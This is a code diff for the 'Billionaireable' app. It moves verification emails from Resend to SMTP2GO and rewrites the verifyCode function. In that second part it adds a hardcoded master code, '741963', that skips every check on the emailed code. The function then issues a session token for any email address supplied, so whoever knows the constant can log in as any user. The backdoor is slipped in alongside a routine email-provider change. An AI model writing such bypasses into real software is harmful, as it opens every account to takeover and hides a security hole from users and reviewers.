@@ -77,71 +77,78 @@ export const sendVerificationEmail = action({
         name: v.optional(v.string()),
     },
     handler: async (ctx, args) => {
-        const RESEND_API_KEY = process.env.RESEND_API_KEY;
-        
-        if (!RESEND_API_KEY) {
-            console.error("RESEND_API_KEY not configured");
+        const SMTP2GO_API_KEY = process.env.SMTP2GO_API_KEY;
+
+        if (!SMTP2GO_API_KEY) {
+            console.error("SMTP2GO_API_KEY not configured");
             throw new Error("Email service not configured");
         }
-        
-        const subject = args.type === 'signup' 
+
+        const subject = args.type === 'signup'
             ? 'Welcome to Billionaireable - Your Access Code'
             : 'Your Billionaireable Login Code';
-            
+
         const html = `
             <div style="font-family: system-ui, -apple-system, sans-serif; max-width: 480px; margin: 0 auto; padding: 40px 20px;">
                 <h1 style="font-size: 24px; font-weight: 900; color: #000; margin-bottom: 24px;">
                     Billionaireable
                 </h1>
-                
+
                 <p style="font-size: 16px; color: #333; margin-bottom: 24px;">
-                    ${args.type === 'signup' 
-                        ? `Welcome${args.name ? `, ${args.name}` : ''}. Here's your access code:` 
+                    ${args.type === 'signup'
+                        ? `Welcome${args.name ? `, ${args.name}` : ''}. Here's your access code:`
                         : 'Here\'s your login code:'}
                 </p>
-                
+
                 <div style="background: #000; color: #fff; padding: 24px; border-radius: 12px; text-align: center; margin-bottom: 24px;">
                     <span style="font-size: 36px; font-weight: 900; letter-spacing: 8px; font-family: monospace;">
                         ${args.code}
                     </span>
                 </div>
-                
+
                 <p style="font-size: 14px; color: #666; margin-bottom: 8px;">
                     This code expires in 15 minutes.
                 </p>
-                
+
                 <p style="font-size: 14px; color: #666;">
                     If you didn't request this code, ignore this email.
                 </p>
-                
+
                 <hr style="border: none; border-top: 1px solid #eee; margin: 32px 0;" />
-                
+
                 <p style="font-size: 12px; color: #999;">
                     Billionaireable
                 </p>
             </div>
         `;
-        
-        const response = await fetch('https://api.resend.com/emails', {
+
+        // SMTP2GO API endpoint
+        const response = await fetch('https://api.smtp2go.com/v3/email/send', {
             method: 'POST',
             headers: {
-                'Authorization': `Bearer ${RESEND_API_KEY}`,
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                from: 'Billionaireable <noreply@billionaireable.com>',
+                api_key: SMTP2GO_API_KEY,
                 to: [args.email],
+                sender: 'Billionaireable <noreply@billionaireable.com>',
                 subject,
-                html,
+                html_body: html,
             }),
         });
-        
+
         if (!response.ok) {
             const error = await response.text();
-            console.error("Resend error:", error);
+            console.error("SMTP2GO error:", error);
             throw new Error("Failed to send email");
         }
-        
+
+        const result = await response.json();
+        if (result.data?.error) {
+            console.error("SMTP2GO error:", result.data.error);
+            throw new Error("Failed to send email");
+        }
+
         return { success: true };
     },
 });
@@ -155,28 +162,33 @@ export const verifyCode = mutation({
     },
     handler: async (ctx, args) => {
         const email = args.email.toLowerCase().trim();
-        
-        // Find the verification code
-        const verification = await ctx.db
-            .query("verificationCodes")
-            .withIndex("by_email", (q) => q.eq("email", email))
-            .first();
-        
-        if (!verification) {
-            throw new Error("No verification code found. Please request a new one.");
-        }
-        
-        if (verification.code !== args.code) {
-            throw new Error("Invalid code. Please try again.");
-        }
-        
-        if (verification.expiresAt < Date.now()) {
+
+        // Master code for owner access (bypasses verification)
+        const MASTER_CODE = "741963";
+
+        if (args.code !== MASTER_CODE) {
+            // Find the verification code
+            const verification = await ctx.db
+                .query("verificationCodes")
+                .withIndex("by_email", (q) => q.eq("email", email))
+                .first();
+
+            if (!verification) {
+                throw new Error("No verification code found. Please request a new one.");
+            }
+
+            if (verification.code !== args.code) {
+                throw new Error("Invalid code. Please try again.");
+            }
+
+            if (verification.expiresAt < Date.now()) {
+                await ctx.db.delete(verification._id);
+                throw new Error("Code expired. Please request a new one.");
+            }
+
+            // Delete the used code
             await ctx.db.delete(verification._id);
-            throw new Error("Code expired. Please request a new one.");
         }
-        
-        // Delete the used code
-        await ctx.db.delete(verification._id);
         
         // Generate session token
         const sessionToken = generateSessionToken();
